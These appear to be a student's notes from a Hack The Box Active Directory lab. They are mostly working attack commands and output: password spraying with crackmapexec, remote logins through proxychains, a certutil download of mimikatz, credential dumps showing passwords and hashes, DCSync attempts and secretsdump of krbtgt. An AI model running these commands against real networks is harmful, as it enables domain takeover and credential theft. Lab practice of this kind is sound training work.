### Any AD users can login to 172.16.5.200
Although, it seems useless

```
$crackmapexec smb 172.16.5.0/24 --local-auth -u administrator -p 'Welcome123!' | grep +

SMB         172.16.5.130    445    FILE01           [+] FILE01\administrator:Welcome123! (Pwn3d!)
SMB         172.16.5.200    445    DEV01            [+] DEV01\administrator:Welcome123! (Pwn3d!)
```

### Rabbit Holes
```
evil-winrm -i 172.16.5.5 -u dhawkins -p Bacon1989
xfreerdp /u:dhawkins /p:'Bacon1989' /v:172.16.5.5
```

### SSH is better than RDP
```
ssh htb-studnet@10.129.139.2
```

### Login and dump the hash with mimikatz
```
proxychains evil-winrm -i 172.16.5.130 -u administrator -p Welcome123!
proxychains evil-winrm -i 172.16.5.130 -u asmith -p Welcome1
proxychains evil-winrm -i 172.16.5.130 -u abouldercon -p Welcome1
```
```
certutil -urlcache -f http://172.16.5.225:8000/mimikatz.exe mimikatz.exe
```

```
         * Username : clusteragent
         * Domain   : INLANEFREIGHT.LOCAL
         * Password : 007Agent

                 kerberos :
         * Username : wley
         * Domain   : INLANEFREIGHT.LOCAL
         * Password : Cargonet2

         * Username : backupagent
         * Domain   : INLANEFREIGHT
         * NTLM     : 242c18dc94ae4fd51f0544a83f6e593f
         * SHA1     : 5893547f160f54591fa8af2214538c0615b83424
         * DPAPI    : 68b009672717f2f250c32ed96eb74279
```

### clusteragent is enough
```
evil-winrm -i 172.16.5.5 -u clusteragent -p 007Agent    # -> YEAH! d0c_pwN_r3p0rt_reP3at!
```

### mimikatz not working properly with DCSync attack
```
.\mimikatz.exe lsadump::dcsync /user:inlanefreight\krbtgt exit
.\mimikatz.exe lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\krbtgt exit
.\mimikatz.exe lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:krbtgt exit
.\mimikatz.exe lsadump::dcsync /user:krbtgt exit
.\mimikatz.exe lsadump::dcsync /user:INLANEFREIGHT\KRBTGT exit
```
Above failed may due to the evil shell not functional enough for mimikatz

### Using secretsdump intead
```
secretsdump.py inlanefreight/clusteragent@172.16.5.5 -just-dc-user inlanefreight/krbtgt
secretsdump.py inlanefreight/clusteragent@172.16.5.5 -just-dc-user inlanefreight/svc_reporting
```
### Then crack hash to login
evil-winrm -i 172.16.5.5 -u svc_reporting -p Reporter1!
proxychains xfreerdp /u:svc_reporting /p:Reporter1! /v:172.16.5.5
proxychains xfreerdp /u:svc_reporting /p:Reporter1! /v:172.16.5.200 # login successfull but meaningless
### net user svc_reporting
It can be used to See Which Groups a Particular User Belongs to